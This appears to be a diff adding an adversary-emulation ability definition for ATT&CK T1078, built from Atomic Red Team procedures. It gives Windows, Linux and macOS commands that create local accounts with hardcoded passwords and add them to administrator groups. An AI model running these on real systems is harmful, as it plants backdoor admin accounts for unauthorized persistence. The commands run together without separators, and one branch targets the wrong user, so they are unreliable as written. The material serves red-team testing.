@@ -1,0 +1,27 @@
+- id: 5d0e5dbb-21a4-4dcf-9dcd-90d9650e4705
+  name: Valid Accounts
+  description: Ability for Valid Accounts (ATT&CK T1078). Generated from Atomic Red
+    Team procedures; review and test safely before use.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1078
+    name: Valid Accounts
+  platforms:
+    windows:
+      psh:
+        command: 'net user art-test /add net user art-test #{password} net localgroup
+          administrators art-test /add'
+    linux:
+      sh:
+        command: password=$(openssl passwd -1 art) ([ "$(uname)" = 'Linux' ] && useradd
+          --shell /bin/bash --create-home --password $password art) || (pw useradd
+          art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))
+          su art -c "whoami; exit"
+    darwin:
+      sh:
+        command: dscl . -create /Users/AtomicUser dscl . -create /Users/AtomicUser
+          UserShell /bin/bash dscl . -create /Users/AtomicUser RealName "Atomic User"
+          dscl . -create /Users/AtomicUser UniqueID 503 dscl . -create /Users/AtomicUser
+          PrimaryGroupID 503 dscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser
+          dscl . -passwd /Users/AtomicUser mySecretPassword dscl . -append /Groups/admin
+          GroupMembership AtomicUser
